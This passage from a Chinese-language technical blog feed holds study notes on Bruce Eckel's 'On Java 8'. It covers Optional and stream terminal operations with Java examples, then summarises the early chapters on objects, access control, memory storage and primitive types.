本身已经是empty，则直接传回。</li></ul></li><li><p><strong>filter操作</strong>:对于普通流的filter操作,如果Predicate返回false,会将元素从流中删除;但是对于Optional的filter操作,如果Predicate返回false,会将Optional变为Optional.empty</p></li></ul><pre><code class="language-java">class OptionalFilter &#123;  static String[] elements = &#123;    &quot;Foo&quot;, &quot;&quot;, &quot;Bar&quot;, &quot;Baz&quot;, &quot;Bingo&quot;  &#125;;  static Stream&lt;String&gt; testStream() &#123;    return Arrays.stream(elements);  &#125;  static void  test(String descr, Predicate&lt;String&gt; pred) &#123;    System.out.println(&quot; ---( &quot; + descr + &quot; )---&quot;);    for(int i = 0; i &lt;= elements.length; i++) &#123;      System.out.println(        testStream()          .skip(i)          .findFirst()          .filter(pred));    &#125;  &#125;  public static void main(String[] args) &#123;    test(&quot;true&quot;, str -&gt; true);    test(&quot;false&quot;, str -&gt; false);    test(&quot;str != \&quot;\&quot;&quot;, str -&gt; str != &quot;&quot;);    test(&quot;str.length() == 3&quot;, str -&gt; str.length() == 3);    test(&quot;startsWith(\&quot;B\&quot;)&quot;,         str -&gt; str.startsWith(&quot;B&quot;));  &#125;&#125;/* Output: ---( true )---Optional[Foo]Optional[]Optional[Bar]Optional[Baz]Optional[Bingo]Optional.empty ---( false )---Optional.emptyOptional.emptyOptional.emptyOptional.emptyOptional.emptyOptional.empty ---( str != &quot;&quot; )---Optional[Foo]Optional.emptyOptional[Bar]Optional[Baz]Optional[Bingo]Optional.empty ---( str.length() == 3 )---Optional[Foo]Optional.emptyOptional[Bar]Optional[Baz]Optional.emptyOptional.empty ---( startsWith(&quot;B&quot;) )---Optional.emptyOptional.emptyOptional[Bar]Optional[Baz]Optional[Bingo]Optional.empty*/</code></pre><ul><li><strong>flatMap操作</strong>:适用函数必须已经包装在Optional中,否则会报错</li></ul><pre><code class="language-java">  static void test(String descr,    Function&lt;String, Optional&lt;String&gt;&gt; func) &#123;    System.out.println(&quot; ---( &quot; + descr + &quot; )---&quot;);    for(int i = 0; i &lt;= elements.length; i++) &#123;      System.out.println(        testStream()          .skip(i)          .findFirst()          .flatMap(func));    &#125;  &#125;</code></pre><h4 id="14.4.4-%E7%94%B1optional%E7%BB%84%E6%88%90%E7%9A%84%E6%B5%81" tabindex="-1">14.4.4 由Optional组成的流</h4><ul><li>下面代码中实现了一个Optional的流,并展示如何从中得到值(使用<strong>get()函数</strong>)</li></ul><pre><code class="language-java">public class Signal &#123;  private final String msg;  public Signal(String msg) &#123; this.msg = msg; &#125;  public String getMsg() &#123; return msg; &#125;  @Override public String toString() &#123;    return &quot;Signal(&quot; + msg + &quot;)&quot;;  &#125;  static Random rand = new Random(47);  public static Signal morse() &#123;    switch(rand.nextInt(4)) &#123;      case 1: return new Signal(&quot;dot&quot;);      case 2: return new Signal(&quot;dash&quot;);      default: return null;    &#125;  &#125;  public static Stream&lt;Optional&lt;Signal&gt;&gt; stream() &#123;    return Stream.generate(Signal::morse)      .map(signal -&gt; Optional.ofNullable(signal));  &#125;&#125;public class StreamOfOptionals &#123;  public static void main(String[] args) &#123;    Signal.stream()      .limit(10)      .forEach(System.out::println);    System.out.println(&quot; ---&quot;);    Signal.stream()      .limit(10)      .filter(Optional::isPresent)      .map(Optional::get)      .forEach(System.out::println);  &#125;&#125;/* Output:Optional[Signal(dash)]Optional[Signal(dot)]Optional[Signal(dash)]Optional.emptyOptional.emptyOptional[Signal(dash)]Optional.emptyOptional[Signal(dot)]Optional[Signal(dash)]Optional[Signal(dash)] ---Signal(dot)Signal(dot)Signal(dash)Signal(dash)*/</code></pre><h3 id="14.5-%E7%BB%88%E7%BB%93%E6%93%8D%E4%BD%9C" tabindex="-1">14.5 终结操作</h3><ol><li>将流转换为一个数组</li></ol><ul><li><strong>toArray()</strong>:将流转换为一个数组,如果流为空,返回一个长度为0的数组</li><li><strong>toArray(generator)</strong>:返回一个由generator函数生成的数组</li></ul><ol start="2"><li>在每个流元素上应用某个终结操作</li></ol><ul><li><strong>forEach(Consumer)</strong>:对每个元素应用Consumer函数(可以以任何顺序操作元素,但只有在引入多cpu运行时才有效)</li><li><strong>forEachOrdered(Consumer)</strong>:对每个元素应用Consumer函数,并且按照原始流顺序执行</li></ul><pre><code class="language-java">public class ForEach &#123;  static final int SZ = 14;  public static void main(String[] args) &#123;    rands().limit(SZ)      .forEach(n -&gt; System.out.format(&quot;%d &quot;, n));    System.out.println();    rands().limit(SZ)      .parallel()      .forEach(n -&gt; System.out.format(&quot;%d &quot;, n));    System.out.println();    rands().limit(SZ)      .parallel()      .forEachOrdered(n -&gt; System.out.format(&quot;%d &quot;, n));  &#125;&#125;/* Output:258 555 693 861 961 429 868 200 522 207 288 128 551 589551 589 861 555 288 128 429 207 693 200 258 522 868 961258 555 693 861 961 429 868 200 522 207 288 128 551 589*/</code></pre><ol start="3"><li>收集操作</li></ol><ul><li><strong>collect(Collector)</strong>:将流中的元素收集到一个容器中<ul><li><code>.collect(Collectors.toCollection(TreeSet::new));</code></li></ul></li><li><strong>collect(Supplier, BiConsumer, BiConsumer)</strong>:和上面类似,但是Supplier 会创建一个新的结果集合，第一个 BiConsumer 是用来将下一个元素包含到结果中的函数，第二个 BiConsumer 用于将两个值组合起来(较少用到 )</li></ul><ol start="4"><li>组合所有流元素</li></ol><ul><li><strong>reduce(BinaryOperator)</strong>:使用 BinaryOperator 来组合所有的流元素。因为这个流可能为空，所以返回的是一个 Optional</li><li><strong>reduce(identity, BinaryOperator)</strong>:和上面一样，但是将 identity 用作这个组合的初始值。因此，即使这个流是空的，我们仍然能得到 identity 作为结果</li></ul><pre><code class="language-java">class Frobnitz &#123;  int size;  Frobnitz(int sz) &#123; size = sz; &#125;  @Override public String toString() &#123;    return &quot;Frobnitz(&quot; + size + &quot;)&quot;;  &#125;  // 生成器:  static Random rand = new Random(47);  static final int BOUND = 100;  static Frobnitz supply() &#123;    return new Frobnitz(rand.nextInt(BOUND));  &#125;&#125;public class Reduce &#123;  public static void main(String[] args) &#123;    Stream.generate(Frobnitz::supply)      .limit(10)      .peek(System.out::println)      .reduce((fr0, fr1) -&gt; fr0.size &lt; 50 ? fr0 : fr1)      .ifPresent(System.out::println);  &#125;&#125;</code></pre><ul><li>上述代码中,reduce()方法中使用了lambda表达式,其中fr0表示上次调用reduce()时的结果,第二个fr1是当前来自流中的新值.<ul><li>所以在第一次调用reduce()时,会返回Optional.empty(),因此需要使用ifPresent()来检查是否有值</li></ul></li></ul><ol start="5"><li>匹配</li></ol><ul><li><strong>anyMatch(Predicate)</strong>:如果流中的任何一个元素成功匹配 Predicate，返回 true,遇到第一个true就会返回</li><li><strong>allMatch(Predicate)</strong>:如果流中的所有元素都成功匹配 Predicate，返回 true,遇到第一个false就会返回</li><li><strong>noneMatch(Predicate)</strong>:如果流中的所有元素都不成功匹配 Predicate，返回 true,遇到第一个true就会返回</li></ul><ol start="6"><li>选择一个元素</li></ol><ul><li><strong>findFirst()</strong>:返回流中的第一个元素的 Optional，如果流为空则返回 Optional.empty</li><li><strong>findAny()</strong>:返回流中的任意元素的 Optional，如果流为空则返回 Optional.empty,findAny对于非并行的流也会选择第一个</li><li>如果要选择流的最后一个元素,可以使用reduce()方法<code>Stream.of(&quot;one&quot;, &quot;two&quot;, &quot;three&quot;).reduce((n1, n2) -&gt; n2);</code></li></ul><ol start="7"><li>获得流相关的信息</li></ol><ul><li><strong>count()</strong>:返回流中元素的个数</li><li><strong>max(Comparator)</strong>:返回流中最大值</li><li><strong>min(Comparator)</strong>:返回流中最小值</li><li>数值化流的信息<ul><li><strong>average()</strong>:返回流中元素的平均值</li><li><strong>sum()</strong>:返回流中元素的总和</li><li><strong>summaryStatistics()</strong>:返回一个包含流中元素各种统计值的对象,如最大值,最小值,平均值,总和,个数</li></ul></li></ul><h3 id="14.6-%E5%B0%8F%E7%BB%93" tabindex="-1">14.6 小结</h3><ul><li>流改变Java编程的本质,带来了极大的提升</li><li>同时防止了很多Java程序员转向Kotlin和Scala等函数式的JVM语言</li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>On java 8 基础卷（1-7章）</title>
      <link href="/2023/08/16/PL/On%20java8%E5%9F%BA%E7%A1%80%E5%8D%B71-7/"/>
      <url>/2023/08/16/PL/On%20java8%E5%9F%BA%E7%A1%80%E5%8D%B71-7/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/PL/OnJava8/x_x.jpg" alt></p><p>[toc]</p><h2 id="0-%E5%AF%BC%E8%AF%BB" tabindex="-1">0 导读</h2><ul><li><p>摘要：</p><ul><li>本书是布鲁斯 • 埃克尔时隔 15 年，继 Thinking in Java 之后又一力作，基于 Java 的 3 个长期支持版（Java 8、11、17），讲解 Java 核心语法，并对 Java 的核心变化进行详述。全书内容通俗易懂，配合示例讲解逐步深入，并结合实际开发需要，从语言底层设计出发，有效帮读者规避一些常见的开发陷阱。</li><li>主体部分共 22 章，内容包含对象、操作符、控制流、初始化和清理、复用、多态、接口、内部类、集合、函数式编程、流、异常、代码校验、文件、字符串、泛型等。</li><li>本书适合各个层次的 Java 开发者阅读，同时也可作为面向对象程序设计语言以及 Java 语言的参考教材。</li></ul></li><li><p>这是一本2022年的新书</p></li><li><p>Java 是一门派生语言。当时的情况是，早期的语言设计师不想用 C++ 来开发项目，于是创建了一门和 C++ 极为相似的新编程语言，不过也做出了一些改进。这种新编程语言最主要的改动是加入了虚拟机和垃圾收集机制，本书后续章节会对这两点进行详细介绍。</p></li><li><p>语言设计缺陷：PL都有缺陷，但是术业有专攻，合适场景用合适的语言</p></li><li><p>普及程度：java已然大量普及</p></li><li><p>java的发布节奏</p><ul><li><ol><li>每隔6个月发布一个新版本，使用整数作为版本号</li></ol></li><li><ol start="2"><li>发布的版本会包含一些试用功能，让用户可以体验和指出问题。而这种 6 个月的版本节奏，其主要目的可能就在于让用户尽早发现功能试用的相关问题。不过，由于无法保证这些功能之后能够长期存在，一旦这些功能出于某些原因没有达成预期的效果，它们就会被取缔。所以，你不应该依赖这些试用性质的功能。</li></ol></li><li><ol start="3"><li>STS和LTS：Java 8、11、17 都是 LTS 版本，其他版本则是支持周期只有 6 个月的 STS 版本。具体而言，只要有新版本问世，对 STS 版本的支持即宣告终止。类似地，一旦有新的 LTS版本问世，（通常在一年以内）很快也会停止对原 LTS 版本的支持（这里指的是 Oracle 所提供的免费支持，也就是说，OpenJDK 可能会支持更长时间）。</li></ol><ul><li>Short-Term-Support STS 短期支持</li><li>Long-Term-Support LTS 长期支持</li></ul></li></ul></li><li><p>图像用户界面</p><ul><li>Java1.0通过抽象窗口工具集（Abstract Windowing Toolkit, AWT）创建了一种在所有平台上都表现平平的 GUI。</li><li>归根结底，Java 在桌面领域从未真正强大过，甚至从未触及设计师的雄心壮志。</li><li>结果就是，Java 在桌面领域的大多数应用场景是 IDE 以及一些企业内部的应用程序。虽然人们确实也会用 Java 开发用户界面，但要清楚地意识到，这只是 Java 语言的一个小众需求。</li></ul></li><li><p>JDK HTML文档：Oracle 公司为 Java 开发工具集（Java Development Kit, JDK）提供了电子文档，用Web 浏览器即可查看。</p></li><li><p>经过测试的示例：本书创建了一套测试系统，用于展示和验证大多数示例的输出结果。</p></li><li><p><a href="https://github.com/BruceEckel/Onjava8-examples"><strong>源代码</strong></a></p></li></ul><h2 id="01-%E4%BB%80%E4%B9%88%E6%98%AF%E5%AF%B9%E8%B1%A1" tabindex="-1">01 什么是对象</h2><h3 id="1.1-%E6%8A%BD%E8%B1%A1%E7%9A%84%E5%8E%86%E7%A8%8B" tabindex="-1">1.1 抽象的历程</h3><ul><li><p>所有编程语言都是一种抽象</p><ul><li>汇编语言是对计算机底层的一个极简化的抽象</li><li>命令式编程语言（FORTRAN，BASIC，C等）都是对汇编语言的抽象</li><li>然而以上的抽象方式要求根据计算机的结构而非问题的结构来思考</li></ul></li><li><p>构建机器模型的一种替代方式是根据问题构建问题模型，例如</p><ul><li>Prolog语言将所有问题都转换为决策链</li><li>这些编程语言具有强烈的专业性</li></ul></li><li><p>面向对象编程更进一步，具备了更强的通用性</p><ul><li>通过添加新的对象，程序可以将自己改编为一种描述问题的语言：于此，阅读代码即是阅读表述问题的文字</li></ul></li><li><p>SmallTalk是第一门获得成功的面向对象的编程语言，并未Java的出现提供了灵感。Alan Kay总结了该语言的5个特征</p><ul><li><ol><li>万物皆对象</li></ol></li><li><ol start="2"><li>一段对象实际上是对个对象通过发送消息来通知彼此之间要干什么</li></ol></li><li><ol start="3"><li>从内存角度而言，每一个对象都是由其它更为基础的对象组成的</li></ol></li><li><ol start="4"><li>每一个对象都有类型</li></ol></li><li><ol start="5"><li>同一类型的对象可以接收相同的消息</li></ol></li></ul></li><li><p>Grady Booch更为简洁的描述：对象具有状态，行为和标识</p><ul><li>这意味着，对象可以拥有自己的内部属性（状态），方法（用于产生行为），同时每一个对象都有唯一的地址（标识）</li></ul></li></ul><h3 id="1.2-%E5%AF%B9%E8%B1%A1%E5%85%B7%E6%9C%89%E6%8E%A5%E5%8F%A3" tabindex="-1">1.2 对象具有接口</h3><ul><li>类描述了一系列具有相同特征（即数据元素）和行为（即功能方法）的对象</li><li>类其实就是一种抽象的数据类型</li><li>一个类可以创建多个对象</li><li>一个对象能接受什么请求，由其&quot;接口&quot;决定<ul><li>类中定义了&quot;接口&quot;</li><li>接口的响应代码和数据称为&quot;实现&quot;</li></ul></li></ul><h3 id="1.3-%E5%AF%B9%E8%B1%A1%E5%8F%AF%E4%BB%A5%E6%8F%90%E4%BE%9B%E6%9C%8D%E5%8A%A1" tabindex="-1">1.3 对象可以提供服务</h3><ul><li>将对象想象成“服务提供者”<ul><li>提升对象内聚程度</li><li>复用或创建一些提供对应服务以解决问题的对象</li></ul></li></ul><h3 id="1.4-%E9%9A%90%E8%97%8F%E7%9A%84%E5%AE%9E%E7%8E%B0" tabindex="-1">1.4 隐藏的实现</h3><ul><li><p>程序员分为两类</p><ul><li>类的创建者：创建新数据类型的人，暴露必要的接口给客户程序员，隐藏其它不必要的信息</li><li>客户程序员：使用现有数据类型的人，其诉求是通过工具类快速开发应用程序</li></ul></li><li><p>设置访问控制的原因</p><ul><li><ol><li>防止客户程序员接触到他们不该触碰的内容，即用于数据类型内部运转的代码</li></ol></li><li><ol start="2"><li>让库的设计者再改变类的内部工作机制时，不用担心影响到使用该类的客户程序员</li></ol></li></ul></li><li><p>Java提供了3个显示关键字，即访问修饰符（access specifier）</p><ul><li>public：定义的内容可以被所有人访问</li><li>private：内容只能通过类的创建者通过类自身的方法访问，其他人无法访问</li><li>protected：继承的子类可以访问到protected成员，但不能访问到private成员</li></ul></li><li><p>如果不适用修饰符，Java提供一种默认的访问权限：包访问，即一个类可以访问同一个包中的其他类，外部不可访问</p></li></ul><h3 id="1.5-%E5%A4%8D%E7%94%A8%E5%AE%9E%E7%8E%B0" tabindex="-1">1.5 复用实现</h3><ul><li><p>代码复用是我们使用面向对象的编程的一个重要理由</p></li><li><p>新创建的类可以使用任意数量的类型和对象组成，也可以任意组合这些对象，实现想要的功能。</p></li><li><p>利用已有的类组合成一个类，这个概念叫做“组合”（composition）</p><ul><li>组合通常代表一种有的关系，比如“汽车有发动机”</li><li>如果组合是动态的，称为聚合（aggregation）。</li></ul></li><li><p>组合和聚合的区别</p><ul><li>聚合：表示两个对象之间是整体和部分的弱关系，部分的生命周期可以超越整体，比如电脑和鼠标</li><li>组合：表示两个对象之间是整体和部分的强关系，部分的生命周期不能超越整体，或者说不能脱离整体的存在，比如汽车和发动机。</li></ul></li></ul><h3 id="1.6-%E7%BB%A7%E6%89%BF" tabindex="-1">1.6 继承</h3><ul><li>通过继承，子类可以获得父类的属性和方法，而无需重新编写相同的代码。</li><li>子类可以扩展或修改继承自父类的行为，并可以定义自己特有的属性和方法。<ul><li>扩展（extend）和重写</li></ul></li><li>这样，继承提供了一种层次化的类组织方式，使得代码更加模块化和易于维护。</li></ul><h3 id="1.7-%E5%A4%9A%E6%80%81" tabindex="-1">1.7 多态</h3><ul><li><p>对非面向对象编译器：其生成的函数调用会触发“前期绑定”（early binding），意味着编译器会生成对一个具体方法名的调用，该方法名决定了被执行代码的绝对地址。</p></li><li><p>面向对象语言使用机制“后期绑定”（late binding），当你想某个对象发送消息时，知道运行时才会确定那一段代码被调用</p></li><li><p>Java通过特殊方法实现后期绑定，通俗说，当向一个对象啊发消息时，该对象自己会找到解决之道</p></li><li><p>C++中，必须通过virtual 关键字来达到这些目的，因为方法并不具备 默认动态绑定特性，而java默认具有动态绑定的特性，所以无需借助关键字和代码实现多态</p></li></ul><h3 id="1.8-%E5%8D%95%E6%A0%B9%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84" tabindex="-1">1.8 单根层次结构</h3><ul><li>Java中所有的类默认继承自一个终极基类，名字Object</li><li>单根层次结构具备很多优势<ul><li><ol><li>所有对象具有共同的接口，因为属于同一个终极基类</li></ol><ul><li>C++无法保证所有对象属于同一个聚类，从兼容的角度看，这种限制性小的设计对C语言友好，但从面向对象思想的计财处看，必须手动构建类的层次，才能拥有其它面向对象编程语言具有的便捷性</li><li>此外，使用任何新的库时，可能会有不兼容的接口</li><li>C++的灵活性物有所值吗？<ul><li>如果已经花费大量心血编写了C代码，那么答案是肯定的，如果是从头开始，那么使用Java或其它方案会高效很多</li></ul></li></ul></li><li><ol start="2"><li>有利于垃圾回收：这是Java对C++的巨大改进</li></ol></li></ul></li></ul><h3 id="1.9-%E9%9B%86%E5%90%88" tabindex="-1">1.9 集合</h3><ul><li><p>集合：（也可称为容器），会根据你放入其中的内容自行调整通奸。</p></li><li><p>C++中，集合是STL（Standard Template Library 标准模板库）中的一部分，Java也在标准库中提供了大量的集合</p></li><li><p>从程序设计角度，真正需要的是能解决实际问题的集合，选择不同的集合只要有以下零个原因</p><ul><li><ol><li>不同的集合提供了不同类型的接口和行为。</li></ol><ul><li>比如，栈和队列的用途就和Set及List完全不同</li></ul></li><li><ol start="2"><li>不同的集合和特定操作的执行效率有差异</li></ol><ul><li>比如，List的两种基础类型ArrayList，LinkedList，一个是序列列表，一个是链式列表</li></ul></li></ul></li><li><p>参数化类型（泛型）</p><ul><li>因为单根层次结构决定了所有对象属于Object类型，所以一个持有Object的集合可以持有任何对象，使得集合十分易于复用</li><li>然而此时将对象都转型成了Object，取出时需要向下转型，除非明确知道向下转型的具体类型，否则向下转型是不安全的</li><li>Java5引入的特性：支持参数化类型，也称泛型（generics）。可以通过再一堆叫括号中间加上类名来定义泛型</li><li><code>ArrayList&lt;Shape&gt; shape = new ArrayList();</code></li></ul></li></ul><h3 id="1.10-%E5%AF%B9%E8%B1%A1%E5%88%9B%E5%BB%BA%E5%92%8C%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F" tabindex="-1">1.10 对象创建和生命周期</h3><ul><li><p>C++语言的总之时效率有限，所以其对象数据保存交给程序员来管理</p><ul><li>如果要最大化运行效率，可以通过栈区保存对象，或者保存在静态存储区中，这种做法优先考虑分配和释放内存的速度。代价是牺牲了灵活性，必须在编写代码时明确对象的数量，生命周期等</li><li>另外可以在内存池中动态创建对象，这个内存池称为“堆”。该方案知道运行时才能知道需要多少对象，及对象的生命周期和确切的类型，并且堆是在运行是动态管理内存的，所以对分配内存的时间比栈多。</li></ul></li><li><p>动态创建对象是普遍存在的，其基于一个普遍接受的假设：对象往往是复杂的，所以你在创建对象时，查找和释放内存空间带来的额外开销不会造成严重影响。此外，更大的灵活性才是解决常规编程问题的关键。</p></li><li><p>Java只允许动态分配内存，每创建一个对象，都要使用new操作符创建一个对象的动态实例</p></li><li><p>对象的生命周期</p><ul><li>对于允许在栈上创建对象的编程语言，编译器会判断对象将会存在多久以及负责自动销毁该对象。但如果在堆上创建对象，编译器就无从得知生命周期了</li><li>对于C++，必须在编码是明确合适销毁对象，否则如果代码有问题，会造成内存泄漏，导致了许多C++项目的失败。</li><li>而Java底层支持垃圾收集器机制，会自动找到会用的对象并销毁，提供了一种更高级的保证以防止潜在的的内存泄漏</li></ul></li><li><p>Java设计垃圾收集器的意图就是处理内存释放的相关问题</p><ul><li>垃圾收集器直到一个对象何时不再使用，会自动释放对象占用的内存</li><li>并且所有对象都继承自顶层基类Object，以及只能在堆上创建对象的特点</li></ul></li><li><p>使得Java编程比C++简单不少，即程序员需要接入的决策和阻碍都大大减少</p></li></ul><h3 id="1.11-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86" tabindex="-1">1.11 异常处理</h3><ul><li><p>异常处理是将编程语言甚至是操作系统和错误处理机制直接捆绑到一起。</p><ul><li>异常时从错误发生之处“抛出”的对象，而根据错误类型，它可以被异常处理程序所“捕获”</li><li>当代码发生错误时，异常处理机制会使用一条特殊的，并行的执行路径处理这个错误，不影响正常代码的执行</li></ul></li><li><p>Java一开始就会让你接触到异常处理，并且强制你必须使用它</p></li></ul><h3 id="1.12-%E6%80%BB%E7%BB%93" tabindex="-1">1.12 总结</h3><ul><li><p>一段<strong>过程式程序</strong>包含了定义和函数调用。</p><ul><li>如果想搞明白代码做了什么，必须查看它的函数调用以及底层代码</li><li>因此，过程式程序的理解成本很高，因为其设计的表达方式更多的面向计算机</li></ul></li><li><p>面向对象编程中</p><ul><li>对象的定义所呈现的是问题空间的概念，而发送至对象的消息则代表问题的具体活动</li><li>面向对象编程的设计狼好的程序总是易于阅读的，并且复用很常见，代码行数不会太多</li></ul></li></ul><h2 id="02-%E5%AE%89%E8%A3%85java%E5%92%8C%E6%9C%AC%E4%B9%A6%E7%A4%BA%E4%BE%8B" tabindex="-1">02 安装Java和本书示例</h2><h3 id="2.1-%E7%BC%96%E8%BE%91%E5%99%A8" tabindex="-1">2.1 编辑器</h3><p>VScode or Intellij IDEA</p><h3 id="2.2-shell" tabindex="-1">2.2 shell</h3><ul><li>shell,windos称 命令提示符</li><li>目录，windows用反斜杠&quot;“而不是斜杠”&quot;/&quot;来分割一个目录</li><li>shell基础操作</li></ul><h3 id="2.3-%E5%AE%89%E8%A3%85java" tabindex="-1">2.3 安装Java</h3><ul><li>运行Java需要安装JDK（Java Development Kit，Java开发工具集）</li></ul><h3 id="2.4-%E7%A1%AE%E8%AE%A4%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F" tabindex="-1">2.4 确认安装成功</h3><p>在shell窗口输入<code>java -version</code></p><h3 id="2.5-%E5%AE%89%E8%A3%85%E5%92%8C%E8%BF%90%E8%A1%8C%E6%9C%AC%E4%B9%A6%E7%A4%BA%E4%BE%8B" tabindex="-1">2.5 安装和运行本书示例</h3><ul><li>在Github网站下载本书的示例，随后通过gradlew run 运行程序</li></ul><h2 id="03-%E5%AF%B9%E8%B1%A1%E6%97%A0%E5%A4%84%E4%B8%8D%E5%9C%A8" tabindex="-1">03 对象无处不在</h2><h3 id="3.1-%E9%80%9A%E8%BF%87%E5%BC%95%E7%94%A8%E6%93%8D%E4%BD%9C%E5%AF%B9%E8%B1%A1" tabindex="-1">3.1 通过引用操作对象</h3><ul><li>Java将一切视为对象，程序员 实际操作的是该对象的引用</li></ul><pre><code class="language-java">String s;//创建一个引用String s=&quot;asdf&quot;//创建一个引用并进行初始化</code></pre><h3 id="3.2-%E5%BF%85%E9%A1%BB%E5%88%9B%E5%BB%BA%E6%89%80%E6%9C%89%E5%AF%B9%E8%B1%A1" tabindex="-1">3.2 必须创建所有对象</h3><ul><li>引用的作用是关联对象。通常我们使用new关键字来创建对象。</li></ul><h4 id="3.2.1-5%E7%A7%8D%E6%95%B0%E6%8D%AE%E7%9A%84%E5%AD%98%E5%82%A8%E6%96%B9%E5%BC%8F" tabindex="-1">3.2.1 5种数据的存储方式</h4><ul><li><ol><li>寄存器（register）：</li></ol><ul><li>这是最快的数据存储方式，数据会保存在中央处理器（central processing unit，CPU）里。</li><li>而寄存器数量有限，只能按需分配</li><li>除C和C++，在程序中看不到寄存器的存在</li></ul></li><li><ol start="2"><li>栈（stack）：</li></ol><ul><li>数据存储在随机存取存储器（random-access memory，RAM）里，处理器可以通过栈指针直接操作数据。</li><li>栈指针向下申请一块新的内存，向上释放内存</li><li>但在Java系统中，栈上的所有对象都有明确的生命周期，这会限制程序的灵活性</li></ul></li><li><ol start="3"><li>堆（heap）：</li></ol><ul><li>一个通用的内存池（也是RAM），存放所有的Java对象</li><li>new的对象会在堆中分配内存，且编译器不用关心堆上的对象存在多久</li><li>灵活性的代价：分配和清理堆存储比栈存储花费更多时间（但Java的堆内存分配机制已经非常高效了）</li></ul></li><li><ol start="4"><li>常量存储（constant storage）：</li></ol><ul><li>常量通常直接保存在程序代码中，因为其值不变</li><li>有时也会和其它代码分隔开，如在嵌入式系统里，常量可以存储在只读存储器（read-only memory，ROM）中</li></ul></li><li><ol start="5"><li>非RAM存储（non-RAM storage）：</li></ol><ul><li>如果一段数据没有保存在应用程序里，那么该数据的生命周期即不依赖于应用程序是否独立，也不受程序管制。</li><li>典型例子是 “序列化对象”（serialized object），指的是转换为字节流（叫做“序列化”）可以发送至其它机器的对象</li><li>另一个例子是“持久化对象”（persistent object），指的是保存在磁盘上的对象</li><li>这些对象的特点是，它们会将对象转换成其他形式以保存在其他媒介中，然后在需要的时候重新转换回RAM</li></ul></li></ul><h4 id="3.2.2-%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B" tabindex="-1">3.2.2 基本类型</h4><ul><li>new关键字在堆上创建对象，这意味着即使是简单的变量也不会很高效</li><li>对于基本类型，java使用了和C以及C+相同的实现机制，无需使用new来创建基本类型的变量，该变量会在栈上保存它的值，因此运行效率较高</li><li><img src="/images/PL/OnJava8/3_1.jpg" alt></li><li>包装类：可以将基本类型呈现为位于堆上的非原始对象。“自动装箱”机制能够将基本类型对象自动转换为包装类对象</li><li>高精度数字<ul><li>BigInter可以支持任意精度的整数</li><li>BigDecimal用户任意精度的定点数</li></ul></li></ul><h4 id="3.2.3-java%E4%B8%AD%E7%9A%84%E6%95%B0%E7%BB%84" tabindex="-1">3.2.3 Java中的数组</h4><ul><li>许多编程语言都支持数组，然而在C和C++中，数组的本质是内存块，所以使用数组十分危险。</li><li>Java的一个核心设计目的就是安全。<ul><li>例如Java的数组一定会被初始化，并且无法访问数组边界之外的元素</li><li>这种边界检查的代价是需要消耗少许内存，以及运行时需要少量时间验证索引的正确性。</li><li>其背后的假设是，安全性以及生产力的改善可以完全抵消这种代价。</li></ul></li><li>当创建一个用户防止对象的数组时，数组实际包含的是引用，这些引用会初始化为一个特殊的值null</li></ul><h3 id="3.3-%E6%B3%A8%E9%87%8A" tabindex="-1">3.3 注释</h3><p>java中的注释和C++注释一样</p><pre><code class="language-java">/*   里面的文字都是注释*///这是第二种注释</code></pre><h3 id="3.4-%E6%97%A0%E9%A1%BB%E9%94%80%E6%AF%81%E5%AF%B9%E8%B1%A1" tabindex="-1">3.4 无须销毁对象</h3><h4 id="3.4.1-%E4%BD%9C%E7%94%A8%E5%9F%9F" tabindex="-1">3.4.1 作用域</h4><ul><li>大多数过程式的编程语言都具有作用域(scope)的概念，作用域会决定其范围内定义的变量名的可见性和生命周期。</li><li>C，C++，Java的作用域都通过大括号&quot;{}&quot;来定义</li><li>Java中的变量即使在不同作用域也不能重名，这与C和C++不同</li></ul><h4 id="3.4.2-%E5%AF%B9%E8%B1%A1%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F" tabindex="-1">3.4.2 对象的作用域</h4><ul><li>Java对象的生命周期和基本类型不同，使用new创建一个对象后，该对象在作用域结束后依然存在</li></ul><pre><code class="language-java">&#123;  String s = new String(&quot;a string&quot;);&#125;</code></pre><ul><li>在上面代码中，虽然引用s会在作用域结束后消失，但它指向的String对象还会继续占用内存</li><li>Java中垃圾收集器会见时所有通过new创建的对象，并及时的发现哪些对象不再被引用，然后它会释放这些对象所占用的内存<ul><li>这类机制解决了一类非常严重的编程问题：由于程序员忘记释放内存而导致的“内存泄漏（memory leak）”</li></ul></li><li>而在C++中，你不仅要确保对象在需要时随时可用，而且事后还要负责销毁对象</li></ul><h3 id="3.5-%E4%BD%BF%E7%94%A8class%E5%85%B3%E9%94%AE%E5%AD%97%E5%88%9B%E5%BB%BA%E6%96%B0%E7%B1%BB%E5%9E%8B" tabindex="-1">3.5 使用class关键字创建新类型</h3><ul><li>在class关键字后面跟着新的类名创建对象</li></ul><pre><code class="language-java">class ATypeName&#123;  //类的具体实现&#125;ATypeName a = new ATypeName();//使用new关键字创建一个该类的对象</code></pre><ul><li><p>当定义一个类时，可以为其定义两种元素：字段（也称“数据成员”）和方法（也称“成员函数”）</p></li><li><p>基本类型的默认值：</p><ul><li>当一个类的字段是基本类型时，即使没有初始化，也会用有默认值</li><li>这一特点保证了基本类型的字段一定会被初始化（C++不会这么做）<br><img src="/images/PL/OnJava8/3_2.jpg" alt></li></ul></li><li><p>这种机制不会引用与局部变量，因为局部变量不是类的字段。</p></li><li><p>未赋值的局部变量可能回事一个任意值，但在Java中，这将会是一个编译错误，C++中只是警告</p></li></ul><h3 id="3.6-%E6%96%B9%E6%B3%95%EF%BC%8C%E5%8F%82%E6%95%B0%E4%BB%A5%E5%8F%8A%E8%BF%94%E5%9B%9E%E5%80%BC" tabindex="-1">3.6 方法，参数以及返回值</h3><ul><li><p>Java中方法决定了对象可以接受那些信息（也是其它语言中的函数），由最基础的4个部分构成：方法名，参数，返回值，方法体</p><ul><li>方法名和参数列表共同构成了方法的“签名”（signature），方法签名即该方法的唯一标识符</li></ul></li><li><p>参数列表中，实际操作的是引用</p></li></ul><h3 